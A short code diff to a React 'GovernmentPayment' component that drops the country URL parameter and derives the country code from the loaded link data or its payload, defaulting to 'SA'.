@@ -106,7 +106,7 @@ const governmentPaymentTypes = {
 };
 
 const GovernmentPayment = () => {
-  const { id, country } = useParams();
+  const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
@@ -117,7 +117,7 @@ const GovernmentPayment = () => {
   const [amount, setAmount] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const countryCode = country || linkData?.country_code || "SA";
+  const countryCode = linkData?.country_code || linkData?.payload?.selectedCountry || "SA";
   const countryData = getCountryByCode(countryCode);
   const paymentTypes = governmentPaymentTypes[countryCode] || governmentPaymentTypes.SA;
 
